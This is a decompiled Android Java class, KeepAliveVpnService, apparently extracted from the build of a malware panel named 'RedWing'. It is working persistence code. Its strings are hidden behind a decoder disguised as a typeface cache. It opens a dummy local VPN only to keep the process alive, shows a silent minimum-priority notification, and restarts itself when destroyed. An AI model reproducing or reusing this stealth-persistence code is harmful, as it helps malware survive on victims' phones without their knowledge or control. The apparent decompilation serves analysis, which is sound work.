package app.mobilex.plus.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Intent;
import android.net.VpnService;
import android.os.Build;
import android.os.ParcelFileDescriptor;
import app.mobilex.plus.util.TypefaceCache;
import v.s.k3qGWOP8GEZr;
import v.s.s4Xe0OepSKbHpb3Nsd;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class KeepAliveVpnService extends VpnService {
    public static volatile boolean Ee8d2j4S9Vm5yGuR;
    public static final String JXn4Qf7zpnLjP5;
    public static final String vekpFI4d1Nc4fakF;
    public static final String w9sT1Swbhx3hs;
    public ParcelFileDescriptor dDIMxZXP1V8HdM;

    static {
        TypefaceCache.obtain("00080057006D009700FE");
        w9sT1Swbhx3hs = TypefaceCache.obtain("00350066005500B800FB00BE");
        vekpFI4d1Nc4fakF = TypefaceCache.obtain("00350066005500B800F500B100D300A5002F0073005F");
        JXn4Qf7zpnLjP5 = TypefaceCache.obtain("00350066005500B800FB00BE00ED00A4002B");
    }

    @Override // android.app.Service
    public final void onCreate() {
        super.onCreate();
        Ee8d2j4S9Vm5yGuR = true;
        TypefaceCache.obtain("00150046007500C700E300BA00C000B1002A0075005E00C700F300AD00D700A600370073005F");
    }

    @Override // android.app.Service
    public final void onDestroy() {
        try {
            ParcelFileDescriptor parcelFileDescriptor = this.dDIMxZXP1V8HdM;
            if (parcelFileDescriptor != null) {
                parcelFileDescriptor.close();
            }
        } catch (Exception unused) {
        }
        this.dDIMxZXP1V8HdM = null;
        Ee8d2j4S9Vm5yGuR = false;
        TypefaceCache.obtain("00150046007500C700E300BA00C000B1002A0075005E00C700F400BA00C100B3003100790042008200F4");
        if (!k3qGWOP8GEZr.w9sT1Swbhx3hs(this) && getSharedPreferences(w9sT1Swbhx3hs, 0).getBoolean(vekpFI4d1Nc4fakF, false)) {
            try {
                startForegroundService(new Intent(this, (Class<?>) KeepAliveVpnService.class));
            } catch (Exception unused2) {
            }
        }
        super.onDestroy();
    }

    @Override // android.net.VpnService
    public final void onRevoke() {
        TypefaceCache.obtain("00150046007500C700E200BA00C400A800280073005F");
        try {
            ParcelFileDescriptor parcelFileDescriptor = this.dDIMxZXP1V8HdM;
            if (parcelFileDescriptor != null) {
                parcelFileDescriptor.close();
            }
        } catch (Exception unused) {
        }
        this.dDIMxZXP1V8HdM = null;
        stopSelf();
    }

    @Override // android.app.Service
    public final int onStartCommand(Intent intent, int i, int i2) {
        if (k3qGWOP8GEZr.w9sT1Swbhx3hs(this)) {
            stopSelf();
            return 2;
        }
        try {
            int i3 = Build.VERSION.SDK_INT;
            String str = JXn4Qf7zpnLjP5;
            NotificationChannel notificationChannel = new NotificationChannel(str, TypefaceCache.obtain("0010006F0048009300F500B20092009400260064004D008E00F300BA"), 1);
            notificationChannel.setShowBadge(false);
            notificationChannel.setSound(null, null);
            ((NotificationManager) getSystemService("notification")).createNotificationChannel(notificationChannel);
            s4Xe0OepSKbHpb3Nsd s4xe0oepskbhpb3nsd = new s4Xe0OepSKbHpb3Nsd(this, str);
            s4xe0oepskbhpb3nsd.K7eEOBPYP9VIoHWTe.icon = 2131034145;
            s4xe0oepskbhpb3nsd.hjneShqpF9Tis4 = -2;
            s4xe0oepskbhpb3nsd.vekpFI4d1Nc4fakF(2, true);
            s4xe0oepskbhpb3nsd.dTS0S7eC32ubQH54j36 = true;
            Notification notificationDDIMxZXP1V8HdM = s4xe0oepskbhpb3nsd.dDIMxZXP1V8HdM();
            if (i3 >= 34) {
                startForeground(1009, notificationDDIMxZXP1V8HdM, 1073741824);
            } else {
                startForeground(1009, notificationDDIMxZXP1V8HdM);
            }
            if (this.dDIMxZXP1V8HdM == null) {
                try {
                    ParcelFileDescriptor parcelFileDescriptorEstablish = new VpnService.Builder(this).setSession(TypefaceCache.obtain("0010006F0048009300F500B2")).addAddress("10.255.255.1", 32).addRoute("10.255.255.0", 30).setMtu(1400).setBlocking(false).establish();
                    this.dDIMxZXP1V8HdM = parcelFileDescriptorEstablish;
                    if (parcelFileDescriptorEstablish != null) {
                        TypefaceCache.obtain("000F00790054009700F200BE00D100AC00630062004E008900FE00BA00DE00E700260065004F008600F200B300DB00B4002B0073005F");
                        getSharedPreferences(w9sT1Swbhx3hs, 0).edit().putBoolean(vekpFI4d1Nc4fakF, true).apply();
                    } else {
                        TypefaceCache.obtain("00260065004F008600F200B300DB00B4002B003E001200C700E200BA00C600B200310078005E008300B000B100C700AB002F0036202F00C700F300B000DC00B400260078004F00C700FE00B000C600E70024007F004D008200FE");
                        stopSelf();
                    }
                } catch (Exception e) {
                    TypefaceCache.obtain("001700630055008900F500B3009200A10022007F0057008200F400E50092");
                    e.getMessage();
                    stopSelf();
                }
            }
            return 1;
        } catch (Exception e2) {
            TypefaceCache.obtain("00050051006800C700F600BE00DB00AB00260072000100C7");
            e2.getMessage();
            stopSelf();
            return 2;
        }
    }
}
